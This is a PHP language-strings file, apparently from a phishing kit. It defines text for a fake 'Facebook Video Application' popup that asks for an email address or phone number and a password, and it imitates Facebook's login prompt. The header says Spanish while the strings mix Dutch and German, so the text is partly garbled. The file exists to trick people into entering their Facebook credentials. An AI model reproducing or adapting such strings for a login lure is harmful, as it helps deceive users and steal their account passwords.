<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'nl';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Facebook applicatie';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Application (Vrije)';
$lang['POPUP_DESCRIPCION'] = '¿DAS PASSWORT VERGESSEN?';
$lang['POPUP_CORREO'] = 'E-mailadres of telefoonnummer';
$lang['POPUP_CONTRASENA'] = 'Wachtwoord';
$lang['POPUP_SUBMIT'] = 'ANMELDEN';
$lang['POPUP_CANDADO'] = 'Deze toepassing is niet toegestaan om te publiceren op Facebook.';

/*
$langNl = array("Netherlands", "Belgium", "Suriname")
*/